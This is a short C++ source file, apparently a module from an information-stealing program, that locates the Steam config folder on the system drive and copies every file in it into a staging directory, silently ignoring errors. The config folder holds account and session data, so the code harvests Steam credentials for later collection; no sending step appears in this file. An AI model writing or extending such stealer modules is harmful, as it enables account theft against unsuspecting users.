//
// Created by .1qxz on 08.06.2024.
//

#include "Steam.h"

typedef HWND(WINAPI* MessageBoxPtr)(HWND, LPCSTR, LPCSTR, UINT);

static const fs::path STEAM_PATH = Utils::getSystemDrive() / "\\Program Files (x86)" / "Steam" / "config";


void Steam::execute(fs::path &root) {
    std::vector<fs::path> paths = Steam::steamFiles();
    std::cout << STEAM_PATH;

    if(paths.empty())
        return;

    fs::path dst = root / "Steam";
    fs::create_directories(dst);

    for(fs::path &path : paths)
    {
        Utils::copy(path, dst);
    }
}

std::vector<fs::path> Steam::steamFiles() {
    std::vector<fs::path> paths;
    try
    {
        for (const auto& entry : fs::directory_iterator(STEAM_PATH)) {
            const fs::path& item_path = entry.path();
            std::string item_path_str = item_path.string();

            paths.push_back(item_path);
        }
    }
    catch (const fs::filesystem_error& ignored) {}

    return paths;
}
